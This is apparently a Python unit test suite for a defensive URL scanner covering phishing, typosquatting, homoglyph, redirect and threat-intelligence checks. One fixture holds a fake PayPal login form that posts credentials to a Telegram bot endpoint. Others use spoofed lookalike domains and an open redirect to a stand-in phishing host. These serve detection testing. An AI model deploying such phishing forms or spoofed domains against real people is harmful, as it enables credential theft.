"""
Unit test suite for URL Scanner v2 features:
  - URLhaus (abuse.ch)
  - Google Safe Browsing
  - Redirect Analysis (open redirects, downgrades, hop inspection)
  - Phishing Detection (brand targeting, credential forms, exfiltration, kit signatures)
  - Typosquatting (Levenshtein, omission, substitution, insertion, combosquatting, bitsquatting)
  - Homoglyph & IDN Detection (Punycode, Cyrillic/Greek confusables, invisible characters, mixed scripts)
  - Certificate Transparency (crt.sh parsing, history, subdomains)
  - Scan History (SQLite storage, queries, search, export)
  - Threat Graph (entity modeling, ASCII rendering, DOT/HTML export)
"""
import os
import tempfile
import unittest
from unittest.mock import MagicMock, patch

from cert_transparency import check_certificate_transparency
from history import (
    clear_history,
    export_history,
    format_history_table,
    get_scan,
    init_db,
    list_scans,
    save_scan,
    search_scans,
)
from homoglyph import detect_homoglyphs
from phishing_detector import analyze_phishing
from redirect_resolver import analyze_redirect_hops
from safe_browsing import check_safe_browsing
from threat_graph import (
    build_threat_graph,
    export_threat_graph_dot,
    export_threat_graph_html,
    format_threat_graph_ascii,
)
from typosquatting import detect_typosquatting
from url_parser import parse_url
from urlhaus import check_urlhaus


class TestHomoglyphDetection(unittest.TestCase):
    def test_cyrillic_spoofing(self):
        # 'google.com' with Cyrillic 'о' (U+043E)
        domain = "g\u043e\u043egle.com"
        res = detect_homoglyphs(domain)
        self.assertTrue(res["has_homoglyphs"])
        self.assertTrue(res["is_mixed_script"])
        self.assertEqual(res["target_impersonated"], "google")
        self.assertGreaterEqual(len(res["confusable_chars"]), 2)
        self.assertIn("Cyrillic", res["scripts_present"])

    def test_clean_ascii_domain(self):
        res = detect_homoglyphs("https://google.com")
        self.assertFalse(res["has_homoglyphs"])
        self.assertFalse(res["is_mixed_script"])
        self.assertEqual(len(res["confusable_chars"]), 0)

    def test_invisible_characters(self):
        # Domain with zero-width space
        domain = "pay\u200bpal.com"
        res = detect_homoglyphs(domain)
        self.assertTrue(res["has_homoglyphs"])
        self.assertEqual(len(res["invisible_chars"]), 1)
        self.assertIn("Zero Width Space", res["invisible_chars"][0]["name"])


class TestTyposquattingDetection(unittest.TestCase):
    def test_omission_typo(self):
        res = detect_typosquatting("gogle.com")
        self.assertTrue(res["is_typosquat"])
        self.assertEqual(res["matched_brand"], "google")
        self.assertEqual(res["technique"], "omission")

    def test_transposition_typo(self):
        res = detect_typosquatting("googel.com")
        self.assertTrue(res["is_typosquat"])
        self.assertEqual(res["matched_brand"], "google")
        self.assertEqual(res["technique"], "transposition")

    def test_substitution_typo(self):
        # 'o' next to 'p' on QWERTY
        res = detect_typosquatting("payoal.com")
        self.assertTrue(res["is_typosquat"])
        self.assertEqual(res["matched_brand"], "paypal")
        self.assertEqual(res["technique"], "qwerty_substitution")

    def test_insertion_typo(self):
        res = detect_typosquatting("paypaal.com")
        self.assertTrue(res["is_typosquat"])
        self.assertEqual(res["matched_brand"], "paypal")
        self.assertEqual(res["technique"], "insertion")

    def test_combosquatting(self):
        res = detect_typosquatting("paypal-security.com")
        self.assertTrue(res["is_typosquat"])
        self.assertEqual(res["matched_brand"], "paypal")
        self.assertEqual(res["technique"], "combosquatting")

    def test_official_domain_not_flagged(self):
        res = detect_typosquatting("google.com", registered_domain="google.com")
        self.assertFalse(res["is_typosquat"])
        self.assertIsNone(res["matched_brand"])


class TestRedirectAnalysis(unittest.TestCase):
    def test_protocol_downgrade(self):
        hops = [
            {"hop": 0, "url": "https://secure-gate.com/login", "domain": "secure-gate.com", "scheme": "https"},
            {"hop": 1, "url": "http://insecure-target.com/page", "domain": "insecure-target.com", "scheme": "http"},
        ]
        res = analyze_redirect_hops(hops, hops[0]["url"], hops[1]["url"])
        self.assertTrue(res["protocol_downgrade"])
        self.assertGreaterEqual(res["risk_score"], 25)

    def test_open_redirect_detection(self):
        hops = [
            {"hop": 0, "url": "https://trusted.com/auth?redirect_to=http://evil-phish.com", "domain": "trusted.com", "scheme": "https"},
            {"hop": 1, "url": "http://evil-phish.com", "domain": "evil-phish.com", "scheme": "http"},
        ]
        res = analyze_redirect_hops(hops, hops[0]["url"], hops[1]["url"])
        self.assertTrue(res["open_redirect_suspect"])
        self.assertEqual(res["open_redirect_param"], "redirect_to")


class TestPhishingDetector(unittest.TestCase):
    def test_phishing_kit_and_telegram_exfil(self):
        parsed = parse_url("http://login.paypal.verify-account.xyz/index.php")
        html_sample = """
        <html><head><title>PayPal Login</title></head>
        <body>
          <h2>Account Suspended - Action Required</h2>
          <form action="https://api.telegram.org/bot98765:token/sendMessage" method="POST">
            <input type="text" name="email">
            <input type="password" name="pass">
            <button>Login</button>
          </form>
        </body></html>
        """
        res = analyze_phishing(parsed, html_body=html_sample)
        self.assertTrue(res["is_phishing"])
        self.assertTrue(res["phishing_kit_detected"])
        self.assertEqual(res["targeted_brand"], "paypal")
        self.assertGreaterEqual(len(res["exfiltration_endpoints"]), 1)
        self.assertEqual(res["confidence"], "High")

    def test_clean_page(self):
        parsed = parse_url("https://example.com")
        html_sample = "<html><head><title>Example Domain</title></head><body>Hello World</body></html>"
        res = analyze_phishing(parsed, html_body=html_sample)
        self.assertFalse(res["is_phishing"])
        self.assertIsNone(res["targeted_brand"])


class TestURLhaus(unittest.TestCase):
    @patch("requests.post")
    def test_urlhaus_positive_match(self, mock_post):
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.json.return_value = {
            "query_status": "ok",
            "url_status": "online",
            "threat": "malware_download",
            "tags": ["elf", "mozi"],
            "reporter": "threat_hunter",
            "date_added": "2026-11-01 10:00:00",
        }
        mock_post.return_value = mock_resp

        res = check_urlhaus("http://malware.example/bin.sh")
        self.assertTrue(res["listed"])
        self.assertEqual(res["threat"], "malware_download")
        self.assertIn("mozi", res["tags"])
        self.assertEqual(res["url_status"], "online")


class TestSafeBrowsing(unittest.TestCase):
    def test_missing_api_key(self):
        with patch.dict(os.environ, {"SAFE_BROWSING_API_KEY": ""}, clear=True):
            res = check_safe_browsing("http://example.com")
            self.assertTrue(res["skipped"])
            self.assertFalse(res["matched"])

    @patch("requests.post")
    def test_safe_browsing_match(self, mock_post):
        with patch.dict(os.environ, {"SAFE_BROWSING_API_KEY": "dummy_key"}):
            mock_resp = MagicMock()
            mock_resp.status_code = 200
            mock_resp.json.return_value = {
                "matches": [
                    {
                        "threatType": "SOCIAL_ENGINEERING",
                        "platformType": "ANY_PLATFORM",
                        "threat": {"url": "http://evil.com"},
                    }
                ]
            }
            mock_post.return_value = mock_resp

            res = check_safe_browsing("http://evil.com")
            self.assertTrue(res["matched"])
            self.assertIn("SOCIAL_ENGINEERING", res["threat_types"])


class TestCertificateTransparency(unittest.TestCase):
    @patch("requests.get")
    def test_ct_log_parsing(self, mock_get):
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.json.return_value = [
            {
                "not_before": "2024-01-01T00:00:00",
                "issuer_name": 'C=US, O="Let\'s Encrypt", CN=R3',
                "name_value": "api.example.com\n*.example.com",
            },
            {
                "not_before": "2025-06-01T00:00:00",
                "issuer_name": 'C=US, O="DigiCert Inc", CN=DigiCert Global CA',
                "name_value": "admin.example.com",
            },
        ]
        mock_get.return_value = mock_resp

        res = check_certificate_transparency("example.com")
        self.assertEqual(res["total_certs"], 2)
        self.assertGreaterEqual(len(res["discovered_subdomains"]), 2)
        self.assertEqual(res["wildcard_count"], 1)


class TestScanHistory(unittest.TestCase):
    def setUp(self):
        self.fd, self.temp_db = tempfile.mkstemp(suffix=".db")
        os.close(self.fd)
        init_db(self.temp_db)

    def tearDown(self):
        if os.path.exists(self.temp_db):
            os.remove(self.temp_db)

    def test_history_lifecycle(self):
        sample = {
            "input_url": "http://fake-paypal.com",
            "parsed": {"original_url": "http://fake-paypal.com", "registered_domain": "fake-paypal.com", "hostname": "fake-paypal.com"},
            "risk": {"score": 75, "verdict": "High Risk"},
            "dns": {"A": ["1.2.3.4"]},
            "phishing": {"is_phishing": True, "targeted_brand": "paypal"},
        }
        sid = save_scan(sample, db_path=self.temp_db)
        self.assertGreater(sid, 0)

        scans = list_scans(db_path=self.temp_db)
        self.assertEqual(len(scans), 1)
        self.assertEqual(scans[0]["risk_score"], 75)
        self.assertEqual(scans[0]["domain"], "fake-paypal.com")

        rec = get_scan(sid, db_path=self.temp_db)
        self.assertIsNotNone(rec)
        self.assertEqual(rec["data"]["risk"]["score"], 75)

        search_results = search_scans("fake-paypal", db_path=self.temp_db)
        self.assertEqual(len(search_results), 1)

        # Export test
        export_file = self.temp_db + ".json"
        export_count = export_history(export_file, fmt="json", db_path=self.temp_db)
        self.assertEqual(export_count, 1)
        if os.path.exists(export_file):
            os.remove(export_file)

        cleared = clear_history(db_path=self.temp_db)
        self.assertEqual(cleared, 1)
        self.assertEqual(len(list_scans(db_path=self.temp_db)), 0)


class TestThreatGraph(unittest.TestCase):
    def test_threat_graph_building(self):
        sample_scan = {
            "input_url": "http://short.ly/xyz",
            "redirect": {
                "was_redirected": True,
                "redirect_chain": ["http://short.ly/xyz", "http://login.paypal.verify.xyz"],
                "analysis": {"protocol_downgrade": False, "hops": []},
            },
            "parsed": {
                "original_url": "http://login.paypal.verify.xyz",
                "hostname": "login.paypal.verify.xyz",
                "registered_domain": "verify.xyz",
            },
            "dns": {"A": ["203.0.113.5"], "NS": ["ns1.host.com"]},
            "tls": {"valid": True, "issuer": {"organizationName": "Let's Encrypt"}, "not_after": "2026-12-31"},
            "phishing": {"is_phishing": True, "targeted_brand": "paypal", "phishing_kit_detected": True, "exfiltration_endpoints": ["https://api.telegram.org/bot1/send"]},
            "urlhaus": {"listed": True, "threat": "malware_download", "tags": ["mozi"]},
        }
        graph = build_threat_graph(sample_scan)
        self.assertGreaterEqual(graph["entity_count"], 8)
        self.assertGreaterEqual(graph["relationship_count"], 7)

        # ASCII tree test
        ascii_text = format_threat_graph_ascii(graph, use_color=False)
        self.assertIn("THREAT RELATIONSHIP GRAPH", ascii_text)
        self.assertIn("Target Brand: PAYPAL", ascii_text)
        self.assertIn("URLhaus: malware_download", ascii_text)

        # DOT export test
        dot_text = export_threat_graph_dot(graph)
        self.assertIn("digraph ThreatGraph", dot_text)

        # HTML export test
        with tempfile.NamedTemporaryFile(suffix=".html", delete=False) as f:
            html_path = f.name
        try:
            export_threat_graph_html(graph, html_path)
            self.assertTrue(os.path.exists(html_path))
            with open(html_path, "r", encoding="utf-8") as f:
                content = f.read()
            self.assertIn("Threat Relationship Graph", content)
            self.assertIn("canvas", content)
        finally:
            if os.path.exists(html_path):
                os.remove(html_path)


if __name__ == "__main__":
    unittest.main()

